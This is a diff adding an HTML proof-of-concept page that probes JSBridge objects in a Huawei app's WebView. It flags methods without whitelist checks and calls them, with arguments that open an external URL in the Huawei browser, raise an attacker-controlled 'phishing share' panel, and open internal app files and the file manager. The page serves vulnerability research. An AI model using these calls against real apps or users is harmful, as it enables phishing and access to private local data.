@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CloudXLab JSBridge Test</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, sans-serif; background: #f5f5f5; padding: 12px; }
+        h1 { font-size: 18px; color: #333; margin-bottom: 12px; }
+        h2 { font-size: 15px; color: #1a1a1a; margin: 16px 0 8px; padding-bottom: 4px; border-bottom: 2px solid #007DFF; }
+        .btn {
+            display: block; width: 100%; padding: 12px; margin: 6px 0;
+            border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
+            color: #fff; cursor: pointer; text-align: left;
+        }
+        .btn-high { background: #FF3B30; }
+        .btn-med  { background: #FF9500; }
+        .btn-low  { background: #34C759; }
+        .btn-info { background: #007DFF; }
+        .btn:active { opacity: 0.7; }
+        .log {
+            background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 12px;
+            padding: 10px; border-radius: 8px; margin-top: 12px; height: 200px;
+            overflow-y: auto; white-space: pre-wrap; word-break: break-all;
+        }
+        .log-err { color: #FF3B30; }
+        .log-ok  { color: #34C759; }
+        .log-warn { color: #FF9500; }
+        .bridge-name { font-size: 11px; color: #999; margin-left: 4px; }
+        .no-wl { color: #FF3B30; font-size: 10px; }
+        #status { font-size: 12px; color: #666; margin-bottom: 8px; }
+    </style>
+</head>
+<body>
+    <h1>CloudXLab JSBridge Test</h1>
+    <div id="status">页面已加载，点击按钮测试各 JSBridge 接口</div>
+
+    <h2>HiSearchNative <span class="bridge-name">(6 methods, 全部有白名单校验)</span></h2>
+    <button class="btn btn-info" onclick="test_hi_1()">1. openAppWithDeepLink <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-info" onclick="test_hi_2()">2. checkAppInstalled <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-info" onclick="test_hi_3()">3. reportEvent <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-info" onclick="test_hi_4()">4. onBackPressed <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-info" onclick="test_hi_5()">5. splitScreenAndJump <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-info" onclick="test_hi_6()">6. openIap <span class="no-wl">(WL)</span></button>
+
+    <h2>_localWebNative <span class="bridge-name">(9 methods, 5个无白名单!)</span></h2>
+    <button class="btn btn-info" onclick="test_lw_1()">7. onBackPressed <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-info" onclick="test_lw_2()">8. download <span class="no-wl">(WL)</span></button>
+    <button class="btn btn-low"  onclick="test_lw_3()">9. closeOption <span class="no-wl">(无WL)</span></button>
+    <button class="btn btn-low"  onclick="test_lw_4()">10. fullScreenOption <span class="no-wl">(无WL)</span></button>
+    <button class="btn btn-low"  onclick="test_lw_5()">11. collapseScreenOption <span class="no-wl">(无WL)</span></button>
+    <button class="btn btn-high" onclick="test_lw_6()">12. openH5UrlByHwBrowser <span class="no-wl">(无WL! HIGH)</span></button>
+    <button class="btn btn-low"  onclick="test_lw_7()">13. onRegenerateResearchFiles <span class="no-wl">(无WL)</span></button>
+    <button class="btn btn-high" onclick="test_lw_8()">14. shareReport <span class="no-wl">(无WL! HIGH)</span></button>
+    <button class="btn btn-low"  onclick="test_lw_9()">15. getDeepResearchAttach <span class="no-wl">(无WL)</span></button>
+
+    <h2>_localWebNativeFile <span class="bridge-name">(3 methods, 全部无白名单!)</span></h2>
+    <button class="btn btn-high" onclick="test_nf_1()">16. openFile <span class="no-wl">(无WL! HIGH)</span></button>
+    <button class="btn btn-high" onclick="test_nf_2()">17. openFileManager <span class="no-wl">(无WL! HIGH)</span></button>
+    <button class="btn btn-med"  onclick="test_nf_3()">18. getFileInfo <span class="no-wl">(无WL)</span></button>
+
+    <h2>探测</h2>
+    <button class="btn btn-med" onclick="probe()">探测所有 JSBridge 对象是否存在</button>
+    <button class="btn btn-low" onclick="clearLog()">清空日志</button>
+
+    <div class="log" id="log"></div>
+
+<script>
+var logEl = document.getElementById('log');
+var statusEl = document.getElementById('status');
+
+function log(msg, type) {
+    var cls = type === 'err' ? 'log-err' : type === 'warn' ? 'log-warn' : type === 'ok' ? 'log-ok' : '';
+    var time = new Date().toLocaleTimeString();
+    var line = document.createElement('div');
+    line.className = cls;
+    line.textContent = '[' + time + '] ' + msg;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+function clearLog() {
+    logEl.innerHTML = '';
+}
+
+function safeCall(bridgeName, methodName, args) {
+    var bridge = window[bridgeName];
+    if (!bridge) {
+        log('[' + bridgeName + '] 对象不存在', 'err');
+        return null;
+    }
+    if (typeof bridge[methodName] !== 'function') {
+        log('[' + bridgeName + '.' + methodName + '] 方法不存在', 'err');
+        return null;
+    }
+    try {
+        log('调用 [' + bridgeName + '.' + methodName + '] args=' + JSON.stringify(args || []));
+        var result = bridge[methodName].apply(bridge, args || []);
+        if (result !== undefined && result !== null) {
+            log('  返回: ' + JSON.stringify(result), 'ok');
+        } else {
+            log('  调用完成 (无返回值)', 'ok');
+        }
+        return result;
+    } catch (e) {
+        log('  异常: ' + e.message, 'err');
+        return null;
+    }
+}
+
+// ====== 探测 ======
+function probe() {
+    var bridges = ['HiSearchNative', '_localWebNative', '_localWebNativeFile'];
+    bridges.forEach(function(name) {
+        var b = window[name];
+        if (b) {
+            var methods = [];
+            for (var k in b) {
+                if (typeof b[k] === 'function') methods.push(k);
+            }
+            log('[' + name + '] 存在, methods: ' + methods.join(', '), 'ok');
+        } else {
+            log('[' + name + '] 不存在', 'err');
+        }
+    });
+    // 也检查是否有其他 bridge
+    var allKeys = Object.keys(window).filter(function(k) {
+        return typeof window[k] === 'object' && window[k] !== null
+            && !['document','location','navigator','console','screen','history'].includes(k)
+            && !k.startsWith('_test');
+    });
+    log('window 上的对象 keys: ' + allKeys.join(', '), 'warn');
+}
+
+// ====== HiSearchNative (6 methods, 全部有白名单校验) ======
+function test_hi_1() {
+    safeCall('HiSearchNative', 'openAppWithDeepLink',
+        ['vassistant://voice/main', 'com.huawei.hmos.vassistant']);
+}
+function test_hi_2() {
+    safeCall('HiSearchNative', 'checkAppInstalled', ['com.huawei.hmos.vassistant']);
+}
+function test_hi_3() {
+    safeCall('HiSearchNative', 'reportEvent', [1001, JSON.stringify({test: 'cloudxlab'})]);
+}
+function test_hi_4() {
+    safeCall('HiSearchNative', 'onBackPressed');
+}
+function test_hi_5() {
+    safeCall('HiSearchNative', 'splitScreenAndJump', ['https://www.huawei.com']);
+}
+function test_hi_6() {
+    safeCall('HiSearchNative', 'openIap',
+        [JSON.stringify({agentid: '1', agentStatus: 'test', accountType: 'normal', transBuffer: ''})]);
+}
+
+// ====== _localWebNative (9 methods, 5个无白名单) ======
+function test_lw_1() {
+    safeCall('_localWebNative', 'onBackPressed');
+}
+function test_lw_2() {
+    safeCall('_localWebNative', 'download',
+        ['https://huyinglin-predict.github.io/showjs.html', 'test_cloudxlab.txt', function(url, ok) {
+            log('  download callback: url=' + url + ' ok=' + ok);
+        }]);
+}
+function test_lw_3() {
+    safeCall('_localWebNative', 'closeOption');
+}
+function test_lw_4() {
+    safeCall('_localWebNative', 'fullScreenOption');
+}
+function test_lw_5() {
+    safeCall('_localWebNative', 'collapseScreenOption');
+}
+function test_lw_6() {
+    // 无白名单校验！调用后会在华为浏览器打开指定 URL
+    safeCall('_localWebNative', 'openH5UrlByHwBrowser',
+        ['https://huyinglin-predict.github.io/showjs.html', 'cct']);
+}
+function test_lw_7() {
+    safeCall('_localWebNative', 'onRegenerateResearchFiles', [JSON.stringify({action: 'regen'})]);
+}
+function test_lw_8() {
+    // 无白名单校验！调用后会拉起分享面板，分享内容由攻击者控制
+    safeCall('_localWebNative', 'shareReport',
+        [JSON.stringify({
+            shareUrl: 'https://huyinglin-predict.github.io/showjs.html',
+            query: 'CloudXLab 钓鱼分享测试',
+            imageUrl: '',
+            thumbnailUri: undefined
+        })]);
+}
+function test_lw_9() {
+    var result = safeCall('_localWebNative', 'getDeepResearchAttach');
+    if (result) {
+        log('  getDeepResearchAttach 返回对象 keys: ' + Object.keys(result).join(', '), 'warn');
+    }
+}
+
+// ====== _localWebNativeFile (3 methods, 全部无白名单) ======
+function test_nf_1() {
+    // 无白名单校验！传入路径会拉起文件预览
+    safeCall('_localWebNativeFile', 'openFile',
+        ['file:///data/storage/el2/base/haps/entry/files/test.txt']);
+}
+function test_nf_2() {
+    // 无白名单校验！传入路径会拉起文件管理器
+    safeCall('_localWebNativeFile', 'openFileManager',
+        ['file:///data/storage/el2/base/haps/entry/']);
+}
+function test_nf_3() {
+    // 无白名单校验！传入 fileId 查询内部数据库
+    safeCall('_localWebNativeFile', 'getFileInfo',
+        [JSON.stringify({fileId: 'cloudxlab_test_file_id'})]);
+}
+
+// 页面加载完成后自动探测
+window.addEventListener('load', function() {
+    log('=== 页面加载完成，开始自动探测 ===', 'ok');
+    setTimeout(function() {
+        probe();
+        log('=== 探测完成，点击按钮测试各接口 ===', 'ok');
+    }, 500);
+});
+</script>
+</body>
+</html>
